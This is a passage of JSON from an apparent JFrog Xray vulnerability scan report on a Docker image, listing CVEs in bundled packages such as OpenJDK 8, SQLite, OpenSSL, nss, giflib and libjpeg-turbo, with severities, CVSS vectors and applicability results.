                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21968",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-04-19T00:00:00.819Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-21968",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-612405",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Concurrency).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Concurrency).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21144",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2024-07-18T00:00:00.278Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21144",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187941",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35578",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.207Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35578",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-257971",
                    "summary": "A vulnerability found in nss. By this security vulnerability, nss client auth crash without a user certificate in the database and this can lead us to a segmentation fault or crash.",
                    "description": "A vulnerability found in nss. By this security vulnerability, nss client auth crash without a user certificate in the database and this can lead us to a segmentation fault or crash.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-3479",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-10-20T00:00:00.872Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:nss:3.44.3-r0",
                            "cve_id": "CVE-2022-3479",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable function <code>NSS_GetClientAuthData</code> is called</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:nss:3.44.3-r0",
                            "vulnerability_id": "CVE-2022-3479",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-588701",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Scripting).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21; Oracle GraalVM for JDK: 17.0.9; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 5.9 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Scripting).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21; Oracle GraalVM for JDK: 17.0.9; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 5.9 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-20926",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2024-01-17T00:00:00.806Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-20926",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-648332",
                    "summary": "Vulnerability in Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u421, 8u421-perf, 11.0.24, 17.0.12, 21.0.4 and  23. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u421, 8u421-perf, 11.0.24, 17.0.12, 21.0.4 and  23. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21210",
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2024-10-24T00:00:00.827Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21210",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-692383",
                    "summary": "Heap-based Buffer Overflow vulnerability in openEuler giflib on Linux. This vulnerability is associated with program files gif2rgb.C.\n\nThis issue affects giflib: through 5.2.2.",
                    "description": "Heap-based Buffer Overflow vulnerability in openEuler giflib on Linux. This vulnerability is associated with program files gif2rgb.C.\n\nThis issue affects giflib: through 5.2.2.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-31344"
                        }
                    ],
                    "created": "2025-04-09T00:00:00.495Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:giflib:5.1.9-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2025-31344",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-693001",
                    "summary": "In SQLite 3.44.0 through 3.49.0 before 3.49.1, the concat_ws() SQL function can cause memory to be written beyond the end of a malloc-allocated buffer. If the separator argument is attacker-controlled and has a large string (e.g., 2MB or more), an integer overflow occurs in calculating the size of the result buffer, and thus malloc may not allocate enough memory.",
                    "description": "In SQLite 3.44.0 through 3.49.0 before 3.49.1, the concat_ws() SQL function can cause memory to be written beyond the end of a malloc-allocated buffer. If the separator argument is attacker-controlled and has a large string (e.g., 2MB or more), an integer overflow occurs in calculating the size of the result buffer, and thus malloc may not allocate enough memory.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-29087",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2025-04-16T00:00:00.892Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "extended_information": {
                        "short_description": "A design problem in SQLite may lead to remote code execution when parsing a crafted query.",
                        "full_description": "[SQLite](https://sqlite.org/) is a C-language library that implements a self-contained SQL database engine.\n\nThe `concat_ws()` function allows the user to concatenate numerous strings into one string, separated by a separator. It has been discovered that `concatFuncCore()`, the function responsible, contains calculations vulnerable to integer overflow. The result of these calculations is later used to determine the size of a buffer to be allocated in the heap, which is smaller than the allocated data size due to the overflow. This may lead to remote code execution or memory corruption.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "To exploit this issue, attackers must find a remote input where they could control the separator and number of arguments to a `CONCAT_WS` query - which is highly unlikely.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "The impact of this vulnerability is a remote code execution.",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:sqlite-libs:3.28.0-r3",
                            "cve_id": "CVE-2025-29087",
                            "scan_status": 1,
                            "applicability": null,
                            "scanner_explanation": "<p>The scanner checks whether any of the vulnerable functions <code>sqlite3_exec()</code>or <code>sqlite3_prepare()</code> are called in native binaries.</p>\n<p>For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified. The condition is that the SQLite query uses the <code>CONCAT_WS</code> sql function.</p>\n<p>The vulnerability can also be exploited in different programming languages that are able to interface with SQLite via various APIs. The scanner currently does not detect these cases, so it is important to note that supplying user input to SQLite databases through another programming language might also be affected by this vulnerability.</p>",
                            "evidence": null,
                            "info": "An SQLite query is executed, however the scanner cannot determine whether INTERSECT or CONCAT_WS were used in the query",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:sqlite-libs:3.28.0-r3",
                            "vulnerability_id": "CVE-2025-29087",
                            "result": "undetermined"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-196807",
                    "summary": "There is a carry propagation bug in the MIPS32 and MIPS64 squaring procedure. Many EC algorithms are affected, including some of the TLS 1.3 default curves. Impact was not analyzed in detail, because the pre-requisites for attack are considered unlikely and include reusing private keys. Analysis suggests that attacks against RSA and DSA as a result of this defect would be very difficult to perform and are not believed likely. Attacks against DH are considered just feasible (although very difficult) because most of the work necessary to deduce information about a private key may be performed offline. The amount of resources required for such an attack would be significant. However, for an attack on TLS to be meaningful, the server would have to share the DH private key among multiple clients, which is no longer an option since CVE-2016-0701. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0.0. It was addressed in the releases of 1.1.1m and 3.0.1 on the 15th of December 2021. For the 1.0.2 release it is addressed in git commit 6fc1aaaf3 that is available to premium support customers only. It will be made available in 1.0.2zc when it is released. The issue only affects OpenSSL on MIPS platforms. Fixed in OpenSSL 3.0.1 (Affected 3.0.0). Fixed in OpenSSL 1.1.1m (Affected 1.1.1-1.1.1l). Fixed in OpenSSL 1.0.2zc-dev (Affected 1.0.2-1.0.2zb).",
                    "description": "There is a carry propagation bug in the MIPS32 and MIPS64 squaring procedure. Many EC algorithms are affected, including some of the TLS 1.3 default curves. Impact was not analyzed in detail, because the pre-requisites for attack are considered unlikely and include reusing private keys. Analysis suggests that attacks against RSA and DSA as a result of this defect would be very difficult to perform and are not believed likely. Attacks against DH are considered just feasible (although very difficult) because most of the work necessary to deduce information about a private key may be performed offline. The amount of resources required for such an attack would be significant. However, for an attack on TLS to be meaningful, the server would have to share the DH private key among multiple clients, which is no longer an option since CVE-2016-0701. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0.0. It was addressed in the releases of 1.1.1m and 3.0.1 on the 15th of December 2021. For the 1.0.2 release it is addressed in git commit 6fc1aaaf3 that is available to premium support customers only. It will be made available in 1.0.2zc when it is released. The issue only affects OpenSSL on MIPS platforms. Fixed in OpenSSL 3.0.1 (Affected 3.0.0). Fixed in OpenSSL 1.1.1m (Affected 1.1.1-1.1.1l). Fixed in OpenSSL 1.0.2zc-dev (Affected 1.0.2-1.0.2zb).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-4160",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2022-01-30T00:00:00.142Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-4160",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-229060",
                    "summary": "The PPM reader in libjpeg-turbo through 2.0.90 mishandles use of tjLoadImage for loading a 16-bit binary PPM file into a grayscale buffer and loading a 16-bit binary PGM file into an RGB buffer. This is related to a heap-based buffer overflow in the get_word_rgb_row function in rdppm.c.",
                    "description": "The PPM reader in libjpeg-turbo through 2.0.90 mishandles use of tjLoadImage for loading a 16-bit binary PPM file into a grayscale buffer and loading a 16-bit binary PGM file into an RGB buffer. This is related to a heap-based buffer overflow in the get_word_rgb_row function in rdppm.c.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-46822",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-06-19T00:00:00.765Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libjpeg-turbo:2.0.4-r1"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-46822",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-99990",
                    "summary": "pragma.c in SQLite through 3.30.1 mishandles NOT NULL in an integrity_check PRAGMA command in certain cases of generated columns.",
                    "description": "pragma.c in SQLite through 3.30.1 mishandles NOT NULL in an integrity_check PRAGMA command in certain cases of generated columns.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2019-19646",
                            "cwe": [
                                "CWE-754"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2020-06-05T00:00:00.584Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "extended_information": {
                        "short_description": "pragma.c in SQLite through 3.30.1 mishandles NOT NULL in an integrity_check PRAGMA command in certain cases of generated columns.",
                        "full_description": "[SQLite](https://www.sqlite.org/index.html) is a very popular lightweight SQL database engine. \n\nThe CVE affects SQLite databases with generated columns, an attacker leveraging this vulnerability can cause unknown impact.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "is_positive": false
                            },
                            {
                                "name": "The issue has no exploit published",
                                "is_positive": true
                            },
                            {
                                "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
                                "is_positive": true
                            },
                            {
                                "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
